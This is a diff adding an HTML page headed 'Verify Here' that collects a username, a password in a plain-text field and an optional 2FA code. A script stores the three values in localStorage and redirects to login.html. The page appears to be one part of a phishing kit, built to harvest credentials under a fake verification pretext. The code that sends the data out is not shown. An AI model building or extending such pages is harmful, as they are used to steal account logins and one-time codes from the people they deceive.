@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Submit Information</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
+            padding: 20px;
+        }
+
+        h1 {
+            text-align: center;
+            color: #333;
+        }
+
+        .form-container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: white;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+
+        .submit-button {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            text-align: center;
+            transition: background-color 0.3s;
+        }
+
+        .submit-button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <h1>Verify Here</h1>
+    <div class="form-container">
+        <div class="form-group">
+            <label for="input1">Username:</label>
+            <input type="text" id="input1" required>
+        </div>
+
+        <div class="form-group">
+            <label for="input2">Password:</label>
+            <input type="text" id="input2" required>
+        </div>
+
+        <div class="form-group">
+            <label for="input3">2fa (if you have):</label>
+            <input type="text" id="input3">
+        </div>
+
+        <button class="submit-button" onclick="redirectToLogin()">Submit</button>
+    </div>
+</body>
+  <script>
+      function redirectToLogin() {
+          const input1 = document.getElementById("input1").value;
+          const input2 = document.getElementById("input2").value;
+          const input3 = document.getElementById("input3").value;
+
+          // Store the data in local storage
+          localStorage.setItem("field1", input1);
+          localStorage.setItem("field2", input2);
+          localStorage.setItem("field3", input3);
+
+          // Redirect to login.html for confirmation
+          window.location.href = "login.html";
+      }
+  </script>
+</html>
